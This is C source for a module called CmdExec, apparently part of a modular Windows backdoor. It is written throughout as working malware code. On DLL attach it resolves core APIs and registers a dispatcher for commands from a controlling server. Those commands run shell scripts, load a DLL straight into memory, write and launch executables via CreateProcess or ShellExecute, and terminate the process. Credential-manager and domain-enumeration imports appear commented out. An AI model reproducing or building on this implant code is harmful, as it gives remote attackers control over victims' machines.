/*
	mod_CmdExec.c
	Main file for module CmdExec
	NB: configuration of this project defines ROUTINES_BY_PTR, so all libs will use definition of a ptr instead of code itself,
	and it is essential to perform proper initialization of all pointers, received from main (core) module

*/


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>

#include "..\inc\dbg.h"
#include "..\shared\ModuleAPI.h"

// internal code modules
#include "ceShellScript.h"
#include "ceDllMemory.h"
#include "ceDiskExec.h"
#include "ceGeneric.h"






#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif



#include "mod_CmdExec.h"

/*
	Imports init function, should contain calls to ALL modules which is used by internal calls (reference build output to check
	which modules are compiled in ROUTINES_BY_PTR when particular module is being build)
*/
BOOL modInitImports(CORE_APIS *pCoreAPIs)
{
	BOOL bRes = TRUE;	// ok by default

	HashedStrings_resolve(pCoreAPIs->HashedStrings_apis);
//	PipeWorks_resolve(pCoreAPIs->PipeWorks_apis);
//	DomainListMachines_resolve(pCoreAPIs->DomainListMachines_apis);
//	CredManager_resolve(pCoreAPIs->CredManager_apis);
//	EmbeddedResources_resolve(pCoreAPIs->EmbeddedResources_apis);
	MyStringRoutines_resolve(pCoreAPIs->MyStringRoutines_apis);
	CryptoStrings_resolve(pCoreAPIs->CryptoStrings_apis);
	RndClass_resolve(pCoreAPIs->RndClass_apis);
//	MailslotWorks_resolve(pCoreAPIs->MailslotWorks_apis); 
	DataCallbackManager_resolve(pCoreAPIs->DataCallbackManager_apis);	
	CommStructures_resolve(pCoreAPIs->CommStructures_apis);

	return bRes;
}

// dispatcher callback waiting for ST_SERVER_COMMAND command
// if matched id fetched, return TRUE and processing answer in dcp structure
// NB: allocated buffer will be disposed by cb manager
BOOL CALLBACK cbCommandDispatcher(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// by default, return FALSE allowing other callback to attempt parsing the packet
	SERVER_COMMAND *sCommand;	// command + payload ptr

	do {	// not a loop

		if (dcp->csType == ST_SERVER_COMMAND) {

			// check for matching cmd id
			if (!(sCommand = (SERVER_COMMAND *)dcp->pInBuffer)) { DbgPrint("ERR: NULL ptr passed as input buffer"); break; }

			switch (sCommand->wCommandId) {

			case SCID_SHELL_SCRIPT:				bRes = cmdShellScript(dcp); break;
			case SCID_DLL_MEMORY:				bRes = cmdDllMemory(dcp); break;
			case SCID_EXE_DISK_CREATEPROCESS:	bRes = cmdDiskExec(dcp, EEM_CREATEPROCESS); break;
			case SCID_EXE_SHELLEXECUTE:			bRes = cmdDiskExec(dcp, EEM_SHELLEXECUTE); break;

			case SCID_TERMINATE_SELF: DbgPrint("WARN: termination command"); ExitProcess(0); break;

			} // switch

		} // ST_SERVER_COMMAND type

	} while (FALSE);	// not a loop

	return bRes;
}

/*
	Routine to be execute when all init are finished
*/
DWORD WINAPI thrModuleRun(LPVOID lpParameter)
{
	DbgPrint("entered");

	// assign listener for server commands
	dcmAddDataCallback(cbCommandDispatcher);

	DbgPrint("finished");

	return 0;
}



// entrypoint function for module
BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	BOOL bRes = TRUE;	// need return TRUE to proceed next
	CORE_APIS *pCoreAPIs = (CORE_APIS *)lpvReserved;
	DWORD dwThreadId;

	if (fdwReason == DLL_PROCESS_ATTACH) {

		DbgPrint("DLL_PROCESS_ATTACH: entered");

		// do apis init in ALL used modules 
		modInitImports(pCoreAPIs);

		// start work thread
		CloseHandle(CreateThread(NULL, 0, thrModuleRun, NULL, 0, &dwThreadId));

		DbgPrint("DLL_PROCESS_ATTACH: done");

	}	// DLL_PROCESS_ATTACH

	return bRes;
}






